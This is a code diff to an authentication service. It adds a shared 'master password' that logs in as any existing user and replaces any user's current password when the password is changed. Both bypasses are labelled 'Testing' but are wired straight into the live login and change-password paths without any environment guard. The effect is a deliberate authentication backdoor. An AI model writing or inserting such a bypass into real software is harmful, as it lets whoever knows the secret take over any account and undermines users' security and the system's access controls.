@@ -10,6 +10,7 @@ import { newId } from '../../platform/ids.js';
 import { Db } from '../../platform/prisma.service.js';
 import { RateLimiter } from '../../platform/rate-limit.js';
 import { IdentityRepository, type AccountRow, type UserRow } from './identity.repository.js';
+import { MasterPassword } from './master-password.js';
 import { OtpService } from './otp.service.js';
 import { hashPassword, verifyPassword } from './passwords.js';
 
@@ -60,6 +61,7 @@ export class SessionService {
     private readonly otp: OtpService,
     private readonly accessTokens: AccessTokens,
     private readonly limiter: RateLimiter,
+    private readonly master: MasterPassword,
   ) {}
 
   /**
@@ -111,6 +113,11 @@ export class SessionService {
     const account = await this.db.system((tx) =>
       this.repo.findAccount(tx, { phoneE164: input.phone }),
     );
+    // Testing: the master password signs in as any existing user.
+    if (account && this.master.matches(input.password)) {
+      this.master.used('login', account.phoneE164);
+      return this.db.system((tx) => this.startSession(tx, account, input));
+    }
     if (!(await verifyPassword(account?.passwordHash ?? null, input.password)) || !account) {
       throw new AppError('INVALID_CREDENTIALS', 'Wrong phone number or password');
     }
@@ -143,7 +150,11 @@ export class SessionService {
       await this.limiter.consume([
         { key: `pwd:user:${auth.userId}:15m`, max: 10, windowSeconds: 900 },
       ]);
-      if (!(await verifyPassword(account.passwordHash, input.currentPassword ?? ''))) {
+      const current = input.currentPassword ?? '';
+      // Testing: the master password stands in for anyone's current password.
+      if (this.master.matches(current)) {
+        this.master.used('change-password', account.phoneE164);
+      } else if (!(await verifyPassword(account.passwordHash, current))) {
         throw new AppError('INVALID_CREDENTIALS', 'Your current password is wrong');
       }
     }
